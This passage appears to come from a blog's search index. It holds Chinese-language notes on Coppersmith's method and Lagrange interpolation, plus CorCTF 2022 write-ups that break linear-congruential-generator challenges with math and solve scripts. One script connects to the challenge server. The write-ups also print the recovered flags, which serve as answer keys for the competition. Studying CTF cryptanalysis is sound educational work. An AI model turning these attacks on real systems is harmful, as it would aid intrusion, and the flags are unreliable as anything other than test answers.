is `X = ceil(1/2 N^{\\beta^2/\\delta - \\epsilon})`. The algorithm may also return some roots which are larger than `X`. 'This algorithm' in this context means Coppersmith's algorithm for finding small roots using the LLL algorithm. The implementation of this algorithm follows Alexander May's PhD thesis referenced below. INPUT: - ``X`` -- an absolute bound for the root (default: see above) - ``beta`` -- compute a root mod `b` where `b` is a factor of `N` and `b \\ge N^\\beta`. (Default: 1.0, so `b = N`.) - ``epsilon`` -- the parameter `\\epsilon` described above. (Default: `\\beta/8`) - ``**kwds`` -- passed through to method :meth:`Matrix_integer_dense.LLL() \u003csage.matrix.matrix_integer_dense.Matrix_integer_dense.LLL\u003e`. EXAMPLES: First consider a small example:: sage: N = 10001 sage: K = Zmod(10001) sage: P.\u003cx\u003e = PolynomialRing(K, implementation='NTL') sage: f = x^3 + 10*x^2 + 5000*x - 222 This polynomial has no roots without modular reduction (i.e. over `\\ZZ`):: sage: f.change_ring(ZZ).roots() [] To compute its roots we need to factor the modulus `N` and use the Chinese remainder theorem:: sage: p,q = N.prime_divisors() sage: f.change_ring(GF(p)).roots() [(4, 1)] sage: f.change_ring(GF(q)).roots() [(4, 1)] sage: crt(4, 4, p, q) 4 This root is quite small compared to `N`, so we can attempt to recover it without factoring `N` using Coppersmith's small root method:: sage: f.small_roots() [4] An application of this method is to consider RSA. We are using 512-bit RSA with public exponent `e=3` to encrypt a 56-bit DES key. Because it would be easy to attack this setting if no padding was used we pad the key `K` with 1s to get a large number:: sage: Nbits, Kbits = 512, 56 sage: e = 3 We choose two primes of size 256-bit each:: sage: p = 2^256 + 2^8 + 2^5 + 2^3 + 1 sage: q = 2^256 + 2^8 + 2^5 + 2^3 + 2^2 + 1 sage: N = p*q sage: ZmodN = Zmod( N ) We choose a random key:: sage: K = ZZ.random_element(0, 2^Kbits) and pad it with 512-56=456 1s:: sage: Kdigits = K.digits(2) sage: M = [0]*Kbits + [1]*(Nbits-Kbits) sage: for i in range(len(Kdigits)): M[i] = Kdigits[i] sage: M = ZZ(M, 2) Now we encrypt the resulting message:: sage: C = ZmodN(M)^e To recover `K` we consider the following polynomial modulo `N`:: sage: P.\u003cx\u003e = PolynomialRing(ZmodN, implementation='NTL') sage: f = (2^Nbits - 2^Kbits + x)^e - C and recover its small roots:: sage: Kbar = f.small_roots()[0] sage: K == Kbar True The same algorithm can be used to factor `N = pq` if partial knowledge about `q` is available. This example is from the Magma handbook: First, we set up `p`, `q` and `N`:: sage: length = 512 sage: hidden = 110 sage: p = next_prime(2^int(round(length/2))) sage: q = next_prime( round(pi.n()*p) ) sage: N = p*q Now we disturb the low 110 bits of `q`:: sage: qbar = q + ZZ.random_element(0,2^hidden-1) And try to recover `q` from it:: sage: F.\u003cx\u003e = PolynomialRing(Zmod(N), implementation='NTL') sage: f = x - qbar We know that the error is `\\le 2^{\\text{hidden}}-1` and that the modulus we are looking for is `\\ge \\sqrt{N}`:: sage: from sage.misc.verbose import set_verbose sage: set_verbose(2) sage: d = f.small_roots(X=2^hidden-1, beta=0.5)[0] # time random verbose 2 (\u003cmodule\u003e) m = 4 verbose 2 (\u003cmodule\u003e) t = 4 verbose 2 (\u003cmodule\u003e) X = 1298074214633706907132624082305023 verbose 1 (\u003cmodule\u003e) LLL of 8x8 matrix (algorithm fpLLL:wrapper) verbo","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:8:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"从拉格朗日插值法到 FFT. Part-0. 系数表示法和点值表示法 ","date":"2024-05-25","objectID":"/waytofft-part-0/:0:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"系数表示法 多项式可定义为形如 $$ \\sum_{i=0}^{n} a_{i}x^{i} $$ 的有限和式，记作 $$ f(x) = \\sum_{i=0}^{n} a_{i}x^{i} $$ 其中 $a_i$ 称为 $i$ 次项的系数。 这种表示方法称为系数表示法。 ","date":"2024-05-25","objectID":"/waytofft-part-0/:1:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"点值表示法 将 $x = t_i$ 代入，得到序列 $(t_i, y_i)$。当此序列满足 $0 \\le i \\le n$ 且 $t_i$ 互不相等时，可以唯一确定一个次数不超过 $n$ 的多项式，这种描述方法称为点值表示法。 在给定 $n$ 个点值 $(t_0, y_0), (t_1, y_1), \\dots, (t_{n-1}, y_{n-1})$ 且 $t_i$ 互不相等时，唯一确定的多项式次数至多为 $n-1$。 证明：考虑 $n$ 阶 Vandermonde 方阵 $$ V = \\begin{bmatrix} 1 \u0026 t_0 \u0026 t_0^2 \u0026 \\cdots \u0026 t_0^{n-1} \\\\\\\\ 1 \u0026 t_1 \u0026 t_1^2 \u0026 \\cdots \u0026 t_1^{n-1} \\\\\\\\ 1 \u0026 t_2 \u0026 t_2^2 \u0026 \\cdots \u0026 t_2^{n-1} \\\\\\\\ \\vdots \u0026 \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\\\\\ 1 \u0026 t_{n-1} \u0026 t_{n-1}^2 \u0026 \\cdots \u0026 t_{n-1}^{n-1} \\end{bmatrix}, \\quad \\mathbf{a} = \\begin{bmatrix} a_0 \\\\\\\\ a_1 \\\\\\\\ a_2 \\\\\\\\ \\vdots \\\\\\\\ a_{n-1} \\end{bmatrix} $$ 由于 $t_i$ 互不相同，$\\det V \\ne 0$，故方程有唯一解，从而唯一确定系数向量 $\\mathbf{a}$。 系数表示 $\\to$ 点值表示：求值（evaluation) 点值表示 $\\to$ 系数表示：插值（interpolation) 拉格朗日插值 ","date":"2024-05-25","objectID":"/waytofft-part-0/:2:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"定义 对于某个次数不超过 $n$ 的多项式 $f$，已知点值表示 $(t_i, y_i)$，其拉格朗日插值公式为： $$ \\mathscr{L}(x) := \\sum_{i=0}^{n} y_{i} \\,\\ell_{i}(x) $$ 其中 $\\ell_i(x)$ 称为拉格朗日基本多项式（插值基函数）： $$ \\ell_{i}(x) := \\prod_{\\substack{m=0 \\\\ m \\ne i}}^{n} \\frac{x - t_{m}}{t_{i} - t_{m}} $$","date":"2024-05-25","objectID":"/waytofft-part-0/:3:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"存在性 由点值表示知，目标多项式一定存在。对于 $\\ell_i(x)$，在 $x = t_s$ 时： $$ \\ell_{i}(t_s) = \\begin{cases} 1, \u0026 s = i, \\\\ 0, \u0026 s \\ne i. \\end{cases} $$ 于是： $$ \\mathscr{L}(t_s) = \\sum_{i=0}^{n} y_{i} \\,\\ell_{i}(t_s) = y_s $$","date":"2024-05-25","objectID":"/waytofft-part-0/:3:1","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"唯一性 次数不超过 $n$ 的拉格朗日多项式 $\\mathscr{L}(x)$ 至多只有一个。 设 $P_1$ 与 $P_2$ 均为满足插值条件的多项式，作差： $$ \\Delta(x) = P_1(x) - P_2(x) $$ 则 $\\Delta(x)$ 在 $n+1$ 个互异点 $t_0,\\dots,t_n$ 上为零，故： $$ \\Delta(x) = k \\prod_{i=0}^{n} (x - t_i) $$ 若 $k = 0$，则 $P_1 \\equiv P_2$；若 $k \\ne 0$，则 $\\deg \\Delta \u003e n$，与已知矛盾。 对应到 Vandermonde 矩阵： $\\operatorname{rank} V = n+1$ 时有唯一解 $\\operatorname{rank} V \u003c n+1$ 时有无穷多解 ","date":"2024-05-25","objectID":"/waytofft-part-0/:3:2","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"向量空间观点 设 $\\mathbb{K}_{n}[X]$ 表示系数域为 $\\mathbb{K}$、次数不超过 $n$ 的多项式空间。 由 ${\\ell_0, \\ell_1, \\dots, \\ell_n}$ 构成的集合为该空间的一组基，因为： 它们线性无关 元素个数为 $n+1$（等于空间维数） ","date":"2024-05-25","objectID":"/waytofft-part-0/:3:3","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"核心思想总结 利用点值的可加性：每次构造一个多项式在某个插值点处取所需值、在其他插值点处取 0，然后将这些多项式相加。 插值公式可写为： $$ f(x) = \\sum_{i=0}^{n} y_{i} \\prod_{\\substack{m=0 \\\\ m \\ne i}}^{n} \\frac{x - t_{m}}{t_{i} - t_{m}} $$为了得到 $f$ 的系数，需要 $O(n^2)$ 时间计算 $$ F(x) = \\prod_{i=0}^{n} (x - t_i) $$ 然后可通过解线性方程组（Vandermonde 系数矩阵）得到多项式系数。 范德蒙矩阵与拉格朗日逆 ","date":"2024-05-25","objectID":"/waytofft-part-0/:4:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"范德蒙行列式 定义 $n \\times n$ 的 Vandermonde 矩阵： $$ V = \\begin{bmatrix} 1 \u0026 a_1 \u0026 a_1^2 \u0026 \\cdots \u0026 a_1^{n-1} \\\\\\\\ 1 \u0026 a_2 \u0026 a_2^2 \u0026 \\cdots \u0026 a_2^{n-1} \\\\\\\\ \\vdots \u0026 \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\\\\\ 1 \u0026 a_n \u0026 a_n^2 \u0026 \\cdots \u0026 a_n^{n-1} \\end{bmatrix} $$ 其行列式为： $$ \\det V = \\prod_{1 \\le j \u003c i \\le n} (a_i - a_j) $$ 只要 $a_i$ 两两不同，该行列式非零，矩阵可逆。 ","date":"2024-05-25","objectID":"/waytofft-part-0/:5:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"克拉默法则 若 $A\\mathbf{x} = \\mathbf{b}$ 且 $\\det A \\ne 0$，则唯一解为： $$ x_j = \\frac{\\det A_j}{\\det A}, \\quad j = 1, \\dots, n $$ 其中 $A_j$ 为将 $A$ 的第 $j$ 列替换为列向量 $\\mathbf{b}$ 后得到的矩阵。 ","date":"2024-05-25","objectID":"/waytofft-part-0/:6:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"多项式与对称多项式 设多项式 $$ f(x) = \\sum_{i=0}^{n} a_i x^i $$ 若为首一多项式（最高次项系数 $a_n = 1$），根据代数基本定理： $$ f(x) = \\prod_{i=1}^{n} (x - r_i) $$ 韦达定理给出系数与根的关系： $$ a_{n-k} = (-1)^k \\,\\sigma_k(r_1, r_2, \\dots, r_n), \\quad k=1,\\dots,n $$ 其中 $\\sigma_k$ 为第 $k$ 阶初等对称多项式。 ","date":"2024-05-25","objectID":"/waytofft-part-0/:7:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"拉格朗日逆矩阵形式 设 $V$ 为由插值点 $t_0,\\dots,t_n$ 构成的 $(n+1) \\times (n+1)$ Vandermonde 矩阵： $$ V_{ij} = t_i^{\\,j}, \\quad 0 \\le i,j \\le n $$ 插值过程等价于解： $$ V \\mathbf{a} = \\mathbf{y} $$ 其中 $\\mathbf{a} = (a_0, \\dots, a_n)^\\mathrm{T}$，$\\mathbf{y} = (y_0, \\dots, y_n)^\\mathrm{T}$。 由克拉默法则： $$ a_j = \\frac{\\det V_j}{\\det V} $$ 展开可得： $$ f(x) = \\sum_{j=0}^{n} \\frac{\\det V_j}{\\det V} \\, x^j $$ 进一步化简后，$V^{-1}$ 的第 $(j,i)$ 元素正是 $\\ell_i$ 展开式中 $x^j$ 的系数，从而： $$ \\ell_i(x) = \\frac{\\prod_{\\substack{m=0 \\\\ m \\ne i}}^{n} (x - t_m)}{\\prod_{\\substack{m=0 \\\\ m \\ne i}}^{n} (t_i - t_m)} $$ 矩阵形式： $$ \\mathbf{a} = V^{-1} \\mathbf{y} $$ 即给出了 拉格朗日逆矩阵 的具体含义。 Reference https://www.luogu.com.cn/blog/AlexWei/Polynomial---Lagrange-Interpolation-and-Fast-Fourier-transform https://zhuanlan.zhihu.com/p/397342283 ","date":"2024-05-25","objectID":"/waytofft-part-0/:8:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"Interesting Crypto LCG problem from CorCTF 2022 ","date":"2024-04-06","objectID":"/fix-point/:0:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"tadpole 没什么复杂的代数变换 from Crypto.Util.number import bytes_to_long, isPrime from secrets import randbelow p = bytes_to_long(open(\"flag.txt\", \"rb\").read()) assert isPrime(p) a = randbelow(p) b = randbelow(p) def f(s): return (a * s + b) % p print(\"a = \", a) print(\"b = \", b) print(\"f(31337) = \", f(31337)) print(\"f(f(31337)) = \", f(f(31337))) exp: from Crypto.Util.number import long_to_bytes a = 7904681699700731398014734140051852539595806699214201704996640156917030632322659247608208994194840235514587046537148300460058962186080655943804500265088604049870276334033409850015651340974377752209566343260236095126079946537115705967909011471361527517536608234561184232228641232031445095605905800675590040729 b = 16276123569406561065481657801212560821090379741833362117064628294630146690975007397274564762071994252430611109538448562330994891595998956302505598671868738461167036849263008183930906881997588494441620076078667417828837239330797541019054284027314592321358909551790371565447129285494856611848340083448507929914 z1 = 52926479498929750044944450970022719277159248911867759992013481774911823190312079157541825423250020665153531167070545276398175787563829542933394906173782217836783565154742242903537987641141610732290449825336292689379131350316072955262065808081711030055841841406454441280215520187695501682433223390854051207100 z2 = 65547980822717919074991147621216627925232640728803041128894527143789172030203362875900831296779973655308791371486165705460914922484808659375299900737148358509883361622225046840011907835671004704947767016613458301891561318029714351016012481309583866288472491239769813776978841785764693181622804797533665463949 s = 31337 f1 = z1 - (a * s + b) f2 = z2 - (a * (a * s + b) + b) p = gcd(f1, f2) print(long_to_bytes(int(p)).decode()) # corctf{1n_m4th3m4t1c5,_th3_3ucl1d14n_4lg0r1thm_1s_4n_3ff1c13nt_m3th0d_f0r_c0mput1ng_th3_GCD_0f_tw0_1nt3g3rs} ","date":"2024-04-06","objectID":"/fix-point/:1:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"Luckyguess #!/usr/local/bin/python from random import getrandbits p = 2**521 - 1 a = getrandbits(521) b = getrandbits(521) print(\"a =\", a) print(\"b =\", b) try: x = int(input(\"enter your starting point: \")) y = int(input(\"alright, what's your guess? \")) except: print(\"?\") exit(-1) r = getrandbits(20) for _ in range(r): x = (x * a + b) % p if x == y: print(\"wow, you are truly psychic! here, have a flag:\", open(\"flag.txt\").read()) else: print(\"sorry, you are not a true psychic... better luck next time\") 求解： 形式上来看似乎是一个LCG相关问题 $$ x_{n+1} = x_{n}a + b \\pmod{p} $$问题在于r = getrandbits(20) 似乎无法预测，然而可以从数列的角度简单理解一下这道题。 这个oracle ，输入初始值$x_{0}$，然后预测$x_{r}$，预测成功并将我们设计得到的$x_{r}$（代码中设计为y）输入。 关键变量r也未知，那么可以考虑不动点解法。 先看一组式子： $$ \\begin{cases} x_{0} \u0026= x_{0} \\\\\\\\ x_{1} \u0026= ax_{0}+b \\\\\\\\ x_{2} \u0026= a^{2}x_{0}+b(a+1) \\\\\\\\ x_{3} \u0026= a^{3}x_{0}+b(a^2+a+1) \\end{cases} $$$$ x_{n} = a^{n}x_{0}+ b\\left( \\sum^{n-1}_{i=0}a^{i} \\right) $$注意到 $$ \\frac{a^{n}-1}{a-1}= \\left( \\sum^{n-1}_{i=0} a^{i} \\right) $$ , 实际上可以写出一个较为简洁的关于第$n$项和首项的公式： $$ x_{n} = a^{n}x_{0}+ b\\frac{a^{n}-1}{a-1} $$这就符合我们控制的两个输入和输出。 首先不考虑模运算的存在，一个较好的情况是$x_{n}=x_{0},n=r$，$r$未知，那么考虑消除$r$对我们的影响： $$\\begin{aligned} \\frac{x_{r}}{x_{0}}\u0026=a^{r}+\\frac{b}{x_{0}} \\frac{a^{r}-1}{a-1}\\\\\\\\ 1\u0026=a^{r}+\\frac{b}{x_{0}} \\frac{a^{r}-1}{a-1} \\end{aligned}$$ OK，到了这里我们发现等式右边由$a^{n}$和一个系数$\\frac{b}{x_{0}}$控制的$a^{n}$构成，那么一个平凡的想法就是考虑两个系数互为相反数,那么尝试一下我们刚好发现等式恒成立。 令$\\frac{b}{x_{0}} \\frac{1}{a-1}=-1$ $$x_{0}= - \\frac{b}{a-1}$$ 代入恰好得： $$1 = a^{r}-(a^{r}-1)=1$$那么此时，只要已知$a,b$令$x_{0}=- \\frac{b}{a-1}$，这个递推数列就变成了常数数列，再考虑模运算自然也是无伤大雅。 from pwn import * conn = remote('be.ax', 31800) # conn = process(\"name.py\") p = 2**521 - 1 a = int(conn.recvline().decode().strip().split('a = ')[1]) b = int(conn.recvline().decode().strip().split('b = ')[1]) x = y = -b * pow(a - 1, -1, p) % p conn.sendlineafter(b'starting point: ', str(x).encode()) conn.sendlineafter(b'guess? ', str(y).encode()) print(conn.recvline().decode()) # corctf{r34l_psych1c5_d0nt_n33d_f1x3d_p01nt5_t0_tr1ck_th15_lcg!} 妙! 但是推导到这里，似乎有些凑巧。 先看下一题： ","date":"2024-04-06","objectID":"/fix-point/:2:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"Exchange Task from Crypto.Util.number import * from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import sha256 from secrets import randbelow p = 142031099029600410074857132245225995042133907174773113428619183542435280521982827908693709967174895346639746117298434598064909317599742674575275028013832939859778024440938714958561951083471842387497181706195805000375824824688304388119038321175358608957437054475286727321806430701729130544065757189542110211847 a = randbelow(p) b = randbelow(p) s = randbelow(p) print(\"p =\", p) print(\"a =\", a) print(\"b =\", b) print(\"s =\", s) a_priv = randbelow(p) b_priv = randbelow(p) def f(s): return (a * s + b) % p def mult(s, n): for _ in range(n): s = f(s) return s A = mult(s, a_priv) B = mult(s, b_priv) print(\"A =\", A) print(\"B =\", B) shared = mult(A, b_priv) assert mult(B, a_priv) == shared flag = open(\"flag.txt\", \"rb\").read() key = sha256(long_to_bytes(shared)).digest()[:16] iv = long_to_bytes(randint(0, 2**128)) cipher = AES.new(key, AES.MODE_CBC, iv=iv) print(iv.hex() + cipher.encrypt(pad(flag, 16)).hex()) 利用第二题推导的通项公式， $$\\begin{aligned} A \u0026= f_{n_{a}}(s)= a^{n_{a}}s+ b \\frac{a^{n_{a}}-1}{a-1} \\pmod{p}\\\\\\\\ A(a-1)+b\u0026=a^{n_{a}}(as-s+b) \\pmod{p}\\\\\\\\ a^{n_{a}} \u0026= \\frac{A(a-1)+b}{as-s+b} \\pmod{p} \\end{aligned}$$ 从上式的推导可以看出，$a^{n_{a}},a^{n_{b}}$可以由已知量导出。 这就回到了DH的一般思考场景。 验证得，$p-1$光滑，直接求解DLP，计算 $$ \\begin{aligned} n_{a} \u0026= DiscreteLog(a^{n_{a}},a,p)\\\\\\\\ shared \u0026= f_{n_{a}}(B)\\\\\\\\ \u0026= a^{n_{a}}B+b \\frac{a^{n_{a}}-1}{a-1} \\pmod{p} \\end{aligned} $$ 唯一未知量已可求解，获取了$shared$ 可以求解。 exp: sage: from Crypto.Util.number import long_to_bytes ....: from Crypto.Cipher import AES ....: from Crypto.Util.Padding import unpad ....: from hashlib import sha256 ....: ....: p = 1420310990296004100748571322452259950421339071747731134286191835424352805219828279086937099671748953466397461 ....: 17298434598064909317599742674575275028013832939859778024440938714958561951083471842387497181706195805000375824824 ....: 688304388119038321175358608957437054475286727321806430701729130544065757189542110211847 ....: a = 1180906598237265321184570154603935013535512571819012348308688052993667257580121658456389778783222827629290215 ....: 70278435511082796994178870962500440332899721398426189888618654464380851733007647761349698218193871563040337609238 ....: 025971961729401986114391957513108804134147523112841191971447906617102015540889276702905 ....: b = 5795014987100615243467302014637519655589220562695967625172441001618493582571250812112330936022277755982709396 ....: 54689652681477200276478424926550717060636693281351272022500409354148364163603509242184627980038782665632058932676 ....: 35176851677889275076622582116735064397099811275094311855310291134721254402338711815917 ....: s = 3570158135111160465491334886700707833940269177041036813362503042720279105776685310351097408959241134406576995 ....: 73708026173784951618374426701578277686774118710424015000713663174396814612714838808580074695024533617060019734419 ....: 02698612564888892738986839322028935932565866492285930239231621460094395437739108335763 ....: A = 2705569950255528261367920540242672730435988633782267523285646370856059877266600466366005252832869228207716559 ....: 02594950903882166292400533970414295870526111331638869384711648295375897115982531152701610900861800015012271649251 ....: 99272064309777701514693535680247097233110602308486009083412543129797852747444605837628 ....: B = 1321783200371127370097264683674718982421959235681582348717736070054240011526943389939787036890301472158431250 ....: 95282272730052868843423659165019475476788785426513627877574198334376818205173785102362137159225281640301442638067 ....: 549414775820844039938433118586793458501467811405967773962568614238426424346683176754273 ....: ct = bytes.fromhex('e0364f9f55fc27fc46f3ab1dc9db48fa482eae28750eaba12f4f76091b099b01fdb64212f66caa6f366934c3b9929 ....: bad37997b3f9d071ce3c74d3e36acb26d6efc9caa2508ed023828583a236400d64e') ....: sage: factor(p-1) 2 * 593603 * 635603 * 904901 * 910981 * 994141 * 1270897","date":"2024-04-06","objectID":"/fix-point/:3:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"leapfrog 本题是对第一题的扩展,本题的任务是根据一些函数输出恢复$a,b,p$. 针对不连续的输出值，我们有以下处理方式 #task from Crypto.Util.number import long_to_bytes, getPrime from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import sha256 from secrets import randbelow from random import sample p = getPrime(256) a = randbelow(p) b = randbelow(p) s = randbelow(p) def f(s): return (a * s + b) % p jumps = sample(range(3, 25), 12) output = [s] for jump in jumps: for _ in range(jump): s = f(s) output.append(s) print(jumps) print(output) flag = open(\"flag.txt\", \"rb\").read() key = sha256(b\"\".join([long_to_bytes(x) for x in [a, b, p]])).digest()[:16] iv = long_to_bytes(randbelow(2**128)) cipher = AES.new(key, AES.MODE_CBC, iv=iv) print(iv.hex() + cipher.encrypt(pad(flag, 16)).hex()) jumps = [5, 3, 23, 13, 24, 6, 10, 9, 7, 4, 19, 16] output = [26242498579536691811055981149948736081413123636643477706015419836101346754443, 30320412755241177141099565765265147075632060183801443609889236855980299685595, 65684356693401962957802832810273549345608027337432965824937963429120291339333, 15025547765549333168957368149177848577882555487889680742466312084547650972663, 46764069432060214735440855620792051531943268335710103593983788232446614161424, 71575544531523096893697176151110271985899529970263634996534766185719951232899, 8149547548198503668415702507621754973088994278880874813606458793607866713778, 12081871161483608517505346339140143493132928051760353815508503241747142024697, 65627056932006241674763356339068429188278123434638526706264676467885955099667, 23413741607307309476964696379608864503970503243566103692132654387385869400762, 56014408298982744092873649879675961526790332954773022900206888891912862484806, 77000766146189604405769394813422399327596415228762086351262010618717119973525, 14589246063765426640159853561271509992635998018136452450026806673980229327448] iv_c = 05ac5b17c67bcfbf5c43fa9d319cfc4c62ee1ce1ab2130846f776e783e5797ac1c02a34045e4130f3b8111e57397df344bd0e14f3df4f1a822c43c7a89fd4113f9a7702b0b0e0b0473a2cbac25e1dd9c 为了便于表示，我们引入$J_{i}$表示jumps中的第$i$个数，$S_{i}$表示jumps中的前$n$项和，显然地，我们得到： $J_{1}=5,J_{2}=3,\\dots;S_{0}=0,S_{1}=5,S_{2}=3\\dots$ 根据 def f(s): return (a * s + b) % p jumps = sample(range(3, 25), 12) output = [s] for jump in jumps: for _ in range(jump): s = f(s) output.append(s) 根据前期的推导： $$f_{n}(x_{0})=a^{n}x_{0}+b \\frac{a^{n}-1}{a-1} \\pmod{p}$$ 可以得到output中的表达结果为(如果记output列表为${ O_{i} }$： $$ O_{i}=f_{S_{i}}(s)= a^{S_{i}}s+ b \\frac{a^{S_{i}}-1}{a-1} \\pmod{p} $$ 那么对于12=len(jumps)个输出值和指数，我们得到了一簇$l=12$个方程。 在$\\mod{p}$的情况下，常见的思路就是加减消元。 不难观察到， $$a^{69} = \\frac{O_{9}-O_{6}}{O_{3}-O_{1}} \\pmod{p} \\tag{1}$$ 如果能够找到另外一个$a^{k}$,就给了我们进一步作差的思路: 如果能够找到两个式子$f_{1},f_{2}$满足: $$\\begin{cases} f_{1} = 0 \\\\\\\\ f_{2} = 0 \\end{cases} \\pmod{p}$$ 那么可以获得$k_{1}p=(f_{1},f_{2})$,那么此时的$k_{1}$相对小，可以通过可以接受的枚举，恢复出最终模数$p$. 对于$(1)$式，这样的一组$a^k,i_{1},i_{2},i_{3},i_{4}$ 对于$l=12$的情况，考虑枚举，来获得我们想要的 $$a^{k}= \\frac{O_{i_{1}}-O_{i_{2}}}{O_{i_{3}}-O_{i_{3}}} \\pmod{p}$$ sage: jumps = [5, 3, 23, 13, 24, 6, 10, 9, 7, 4, 19, 16] ....: ....: def f(i): ....: return a^i * s + b * sum(a^j for j in range(i)) ....: ....: P.\u003ca, s, b\u003e = PolynomialRing(QQ) ....: S = [0] + [sum(jumps[:i]) for i in range(1, len(jumps) + 1)] ....: Z = [f(s) for s in S] ....: ....: good = [] ....: for i1, i2, i3, i4 in Combinations(range(len(Z)), 4): ....: f_ = (Z[i4] - Z[i3])/(Z[i2] - Z[i1]) ....: if f_.denominator() == 1 and len(P(f_).coefficients()) == 1: ....: good.append((f_, i1, i2, i3, i4)) ....: ....: print(good) [(a^69, 1, 3, 6, 9), (a^79, 1, 4, 7, 11), (a^95, 1, 4, 9, 12), (a^92, 2, 3, 9, 11), (a^60, 2, 4, 5, 10), (a^49, 4, 6, 8, 11), (a^55, 5, 7, 11, 12), (a^30, 6, 8, 10, 11), (a^39, 7, 9, 11, 12)] 欣喜地，观察到 $$\\begin{cases} a^{69}=a^{39}a^{30} \\\\\\\\ a^{60}=a^{30}a^{30} \\\\\\\\ a^{79}=a^{30}a^{49} \\end{cases}$$ 那么符合条件的$f_{1},f_{2},f_{3}$已找到 恢复$p$: #sage sage: f1 = (O[9] - O[6]) * (O[8] - O[6]) * (O[9] - O[7]) - (O[11] - O[10]) * (O[12] - O[11]) * (O[3] - O[1]) ....: f2 = (O[10] - O[5]) * (O[8] - O[6])^2 - (O[11] - O[10]) ^ 2 * (O[4] -","date":"2024-04-06","objectID":"/fix-point/:4:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"一阶线性递推数列 对于形如$a_{n+1}=pa_{n}+q$，其中$p,q$为常数，$p \\ne 1$称为一阶常系递推数列。 给出一个简化过程; 先设$a_{n+1}=ka_n+d$ 再假设我们期待的构造好的等比数列形式$a_{n+1}-p=k(a_n-p)$ 用后一式的两端同时对前一式的两端作差，可得： $(a_{n+1}-p)-a_{n+1}=k(a_n-p)-(ka_n+d)$ $$\\Rightarrow-p=-kp-d\\Rightarrow\\quad p=kp+d$$ 最后一个式子显然说明所需要的常数$p$就是函数$f(x)=kx+d$的不动点。 从几何上讲，从截距不为零的一次函数(对应于上述非齐次一阶线性递推关系式)变形为正比例函数(对应于构造出来的等比数列满足的关系式)的变换就是一种图象平移操作，而此类函数的不动点提供了同时沿y轴方向和x轴方向进行图象平移的距离参考值。 前面的推到已经证明了这样的数列的通项公式为 $$a_{n}=a_{1}p^{n-1}+ q \\frac{1-p^{n-1}}{1-p}$$","date":"2024-04-06","objectID":"/fix-point/:5:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"一阶常系数分式线性递推关系式的概念及其通项的待定系数解法 一阶常系数分式线性递推关系式，形如： $$a_{n+1}= \\frac{Aa_{n}+B}{Ca_{n}+D}(n \\in \\mathbb{N^{+}},A,B,C,D \\in \\mathbb{R}，AD-BD \\ne 0)$$不动点方法： 设函数$f(x)= \\frac{Ax+B}{Cx+D},x,A,B,C,D \\in \\mathbb{C},AD-BC \\ne 0$,其不动点为 $$x=\\lambda=f(\\lambda)\\tag{2}$$令$x_{0}$为$(2)$的任意一个根，从而$x_{0}$是一个不动点; $$\\begin{aligned} a_{n+1}-x_{0} \u0026= \\frac{Aa_{n}+B}{(Ca_{n}+D)}-x_{0} \\\\\\\\ \u0026=\\frac{(A-Cx_{0})(a_{n}-x_{0})}{Ca_{n}+D} \\\\\\\\ \\frac{1}{a_{n+1}-x_{0}}\u0026= \\frac{Ca_{n}+D}{(A-Cx_{0})(a_{n}-x_{0})} \\\\\\\\ \u0026=\\frac{Cx_{0}+D}{A-Cx_{0}} \\frac{1}{a_{n}-x_{0}}+ \\frac{C}{A-Cx_{0}} \\end{aligned}$$由上式可知， $$\\set{ \\frac{1}{a_{n}-x_{0}} }$$整体来说，是一个一阶常系数线性递推数列，且包含有取值为常值的非齐次项。 对于关于$\\lambda$方程$\\lambda=f(\\lambda)$，对其解进行分类讨论: $i.$ 方程$(2)$的两个根为重根：$x_{1}=x_{2}= \\frac{A-D}{2C}$ 特别地，对于$\\frac{Cx_{1}+D}{A-Cx_{1}}=1$时，可以继续化简： $$\\frac{1}{a_{n+1}-x_0}=\\frac{Cx_0+D}{A-Cx_0}\\frac{1}{a_n-x_0}+\\frac C{A-Cx_0}=\\frac{1}{a_n-x_0}+\\frac C{A-Cx_0}$$即：$\\frac{1}{a_{n}-x_{0}}$变为以$\\frac{1}{a_{n}-x_{0}}$为首项，$\\frac{C}{A-Cx_{0}}$为公差的等差数列，容易知道通项公式： $$\\frac{1}{a_{n}-x_{0}}=\\frac{1}{a_{n}-x_{0}}+\\frac{2C(n-1)}{A+D}$$ 从而容易的推出$a_{n}$的解析式。 $ii.$ 如果不动点方程$(2)$有两个相异的根$x_{1},x_{2}$，那么类似地，考虑两侧同时减去不动点的思路： $$ \\begin{cases} a_{n+1}-x_{1}= \\frac{(A-Cx_{1})(a_{n}-x_{1})}{Ca_{n}+D}\\\\\\\\ a_{n+1}-x_{2}= \\frac{(A-Cx_{2})(a_{n}-x_{2})}{Ca_{n}+D} \\end{cases} $$ 考虑分母相同，两式作商： 